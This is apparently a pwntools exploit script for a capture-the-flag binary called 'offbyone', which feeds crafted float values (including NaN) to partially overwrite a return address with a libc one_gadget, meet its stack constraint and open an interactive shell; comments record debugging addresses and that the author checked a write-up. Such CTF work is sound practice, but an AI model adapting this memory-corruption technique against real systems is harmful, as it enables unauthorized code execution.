from pwn import *

# context.log_level = "debug"
# context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./offbyone"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


N = 10000

payload = []

payload2 = [0, float('nan'), 10.0, ]

# nan #0x7fc00--->0x8000
for i in range(64):
    payload.append(20013)

# pwndbg> x 0x00007f225ebbad90 -  0x7f225eb91000
# 0x29d90:        Cannot access memory at address 0x29d90
# one_gadget exebc81

# one-gadget 低2位
for i in range(0xbc81-0x9d90):
    payload.append(20036)

# one-gadget 高2位
for i in range(0xe-0x2):
    payload.append(20037)

# rbp-0x70 == NULL
for i in range(0x80):
    payload.append(20024)

# add rsp,8, 最后一步看了wp才想到，固定套路？
for i in range(17):
    payload.append(20028)

payload += [5] * (N - len(payload) - len(payload2))
payload.extend(payload2)

ddebug("""
# breakrva 0x013a8
breakrva 0x014c5
breakrva 0x1533
continue
""")
io.recvuntil("floats: ")
for f in payload:
    io.sendline(str(f).encode())

io.interactive()
